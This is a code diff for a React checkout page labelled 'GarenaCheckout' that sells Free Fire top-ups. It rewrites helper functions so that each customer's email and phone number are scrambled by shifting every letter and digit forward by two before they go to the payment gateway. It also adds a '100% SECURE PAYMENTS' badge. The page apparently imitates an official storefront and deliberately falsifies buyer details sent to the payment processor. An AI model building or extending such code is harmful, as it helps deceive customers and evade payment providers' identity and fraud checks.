@@ -4,21 +4,25 @@ import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
 import { db } from '../lib/firebase';
 
 // Helper functions for email & phone alteration before sending to payment gateway
+// Email: Shift each letter forward by 2 positions in alphabet (A->C, Y->A, Z->B, etc.)
 function transformEmail(email: string): string {
-  return email
-    .replace(/b/g, 'c')
-    .replace(/B/g, 'C')
-    .replace(/d/g, 'e')
-    .replace(/D/g, 'E')
-    .replace(/f/g, 'g')
-    .replace(/F/g, 'G');
+  return email.replace(/[a-zA-Z]/g, (ch) => {
+    const code = ch.charCodeAt(0);
+    if (code >= 65 && code <= 90) {
+      return String.fromCharCode(((code - 65 + 2) % 26) + 65);
+    }
+    if (code >= 97 && code <= 122) {
+      return String.fromCharCode(((code - 97 + 2) % 26) + 97);
+    }
+    return ch;
+  });
 }
 
+// Phone: Shift each digit forward by 2 positions (0->2, 1->3, ... 8->0, 9->1)
 function transformPhone(phone: string): string {
-  return phone
-    .replace(/8/g, '4')
-    .replace(/3/g, '9')
-    .replace(/2/g, '5');
+  return phone.replace(/[0-9]/g, (digit) => {
+    return String((Number(digit) + 2) % 10);
+  });
 }
 
 const PRODUCT_CATEGORIES: Record<string, string[]> = {
@@ -747,22 +751,42 @@ export default function GarenaCheckout() {
               color: 'white', fontSize: isMobile ? 14 : 16,
               fontWeight: 900, margin: '0 0 5px',
             }}>Free Fire</h1>
-            <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
+            <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', alignItems: 'center' }}>
               <span style={{
-                background: 'rgba(0,0,0,0.55)',
-                border: '1px solid rgba(255,255,255,0.1)',
-                color: 'white', borderRadius: 5,
-                padding: isMobile ? '2px 6px' : '2px 8px',
-                fontSize: isMobile ? 8 : 9,
-                fontWeight: 700, letterSpacing: '0.4px',
-              }}>✓ EASEBUZZ SECURED PAYMENTS</span>
-              <span style={{
-                background: 'linear-gradient(to right, #f59e0b, #eab308)',
-                color: 'black', borderRadius: 5,
-                padding: isMobile ? '2px 6px' : '2px 8px',
-                fontSize: isMobile ? 8 : 9,
+                background: 'rgba(18, 18, 18, 0.85)',
+                border: '1px solid rgba(255, 255, 255, 0.15)',
+                color: 'white',
+                borderRadius: 20,
+                padding: isMobile ? '3px 8px' : '4px 10px',
+                fontSize: isMobile ? 9 : 10,
                 fontWeight: 900,
-              }}>✦ 9TH ANNIVERSARY</span>
+                letterSpacing: '0.4px',
+                display: 'inline-flex',
+                alignItems: 'center',
+                gap: 4
+              }}>
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#10b981" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
+                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                  <path d="m9 12 2 2 4-4" />
+                </svg>
+                100% SECURE PAYMENTS
+              </span>
+              <span style={{
+                background: 'linear-gradient(135deg, #eab308, #ca8a04)',
+                color: '#1a1a1a',
+                borderRadius: 20,
+                padding: isMobile ? '3px 8px' : '4px 10px',
+                fontSize: isMobile ? 9 : 10,
+                fontWeight: 900,
+                display: 'inline-flex',
+                alignItems: 'center',
+                gap: 4
+              }}>
+                <svg width="11" height="11" viewBox="0 0 24 24" fill="currentColor">
+                  <path d="M12 2l2.4 5.2 5.6.8-4 4.1 1 5.7-5-2.8-5 2.8 1-5.7-4-4.1 5.6-.8z" />
+                </svg>
+                9TH ANNIVERSARY
+              </span>
             </div>
           </div>
         </div>
